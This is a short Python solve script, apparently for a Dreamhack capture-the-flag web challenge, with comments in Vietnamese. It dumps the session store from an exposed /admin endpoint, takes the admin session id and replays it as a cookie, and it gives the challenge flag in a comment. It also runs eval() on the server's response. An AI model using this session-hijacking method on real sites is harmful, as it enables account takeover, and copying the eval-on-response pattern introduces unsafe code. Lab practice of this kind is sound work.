import requests

url = 'http://host1.dreamhack.games:18208/'

# 1. Truy cập /admin để lấy session_storage
r = requests.get(url + '/admin')
sessions = r.json() if r.headers.get('Content-Type') == 'application/json' else eval(r.text)

# 2. Tìm sessionid của admin
for sid, user in sessions.items():
    if user == 'admin':
        admin_sid = sid
        break

# 3. Truy cập / với cookie admin
r = requests.get(url + '/', cookies={'sessionid': admin_sid})
print(r.text)

# flag: DH{8f3d86d1134c26fedf7c4c3ecd563aae3da98d5c}